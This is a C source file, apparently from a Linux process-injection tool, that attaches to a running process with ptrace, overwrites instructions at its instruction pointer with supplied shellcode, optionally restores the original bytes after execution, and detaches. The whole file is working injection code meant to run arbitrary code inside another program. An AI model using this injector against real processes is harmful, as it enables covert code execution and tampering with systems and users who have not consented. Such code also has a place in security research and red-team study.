#include "inject.h"

writecb memwrite = ignotum_mem_write;
readcb memread = ignotum_mem_read;

void ptrace_attach(pid_t pid){
    int status;

    if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1){
        bad("failed to attach pid %d | %s\n", pid, strerror(errno));
        exit(1);
    }

    waitpid(pid, &status, 0);

}

inline long getip(pid_t pid){
    return ptrace(PTRACE_PEEKUSER, pid, sizeof(long)*IP, 0L);
}

inline long setip(pid_t pid, long ip){
    return ptrace(PTRACE_POKEUSER, pid, sizeof(long)*IP, ip);
}

void ps_inject(const char *sc, size_t len, inject_t *options){
    char *backup = NULL;
    int status;
    long ip;
    regs_t old_regs;

    ssize_t n;

    info("attaching process %d\n", options->pid);
    ptrace_attach(options->pid);
    good("process attached\n");

    ptrace(PTRACE_GETREGS, options->pid, NULL, &old_regs);

    /* skip system call, e.g, select, poll, nanosleep */
    ip = old_regs.instruction_point+4;
    setip(options->pid, ip);

    if(options->restore){
        backup = xmalloc(len+BREAKPOINT_LEN);
        info("backup previously instructions ...\n");
        n = memread(options->pid, backup, len+BREAKPOINT_LEN, ip);
        info("%zd byte(s) read of %zu\n", n, len+BREAKPOINT_LEN);
    }

    info("writing shellcode on memory ...\n");
    n = memwrite(options->pid, sc, len, ip);
    info("%zd byte(s) written of %zu\n", n, len);

    good("shellcode inject !!!\n");

    if(options->restore){
        info("resuming application ...\n");
        memwrite(options->pid, BREAKPOINT, BREAKPOINT_LEN, ip+len);

        ptrace(PTRACE_CONT, options->pid, NULL, 0);
        waitpid(options->pid, &status, 0);

        info("restoring memory instructions\n");
        memwrite(options->pid, backup, len+BREAKPOINT_LEN, ip);
        free(backup);

        if(options->restore_ip){
            ptrace(PTRACE_SETREGS, options->pid, NULL, &old_regs);
        } else {
            #if defined(__x86_64__) || defined(__i386__)
                setip(options->pid, getip(options->pid)-BREAKPOINT_LEN);
            #endif
        }
    }

    info("detaching pid ...\n");
    ptrace(PTRACE_DETACH, options->pid, NULL, 0);


}
